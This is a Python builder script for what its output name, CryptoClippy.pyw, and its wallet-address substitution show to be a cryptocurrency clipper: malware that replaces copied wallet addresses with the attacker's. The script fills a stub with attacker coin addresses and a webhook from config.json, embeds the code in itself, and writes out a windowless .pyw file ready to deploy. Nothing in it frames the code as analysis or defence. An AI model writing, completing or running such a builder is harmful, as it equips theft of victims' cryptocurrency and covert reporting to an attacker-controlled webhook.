import os
import json
import re
import shutil
import subprocess
import zlib
import base64

shutil.rmtree('temp', ignore_errors=True)
os.mkdir('temp')

with open('src\\stub.py', 'r', encoding='utf-8') as f:
    stub = f.read()

with open('config.json', 'r', encoding='utf-8') as f:
    config = dict(json.load(f))

for coin, address in config.items():
    stub = re.sub(rf'\|{coin}\|?', f'{address}', stub)

hook_value = config['WebHook']
stub = re.sub(r"hook\s*=\s*''", f"hook = '{hook_value}'", stub)
stubcode = stub

stub = re.sub(
    r"thecode\s*=\s*'''.*?'''",
    f"thecode = '''{stubcode.replace("'''", r"\'\'\'")}'''",
    stub,
    flags=re.DOTALL
)

with open('temp\\CryptoClippy.pyw', 'w', encoding='utf-8') as f:
    f.write(stub)

subprocess.run(['explorer', os.path.abspath('temp')])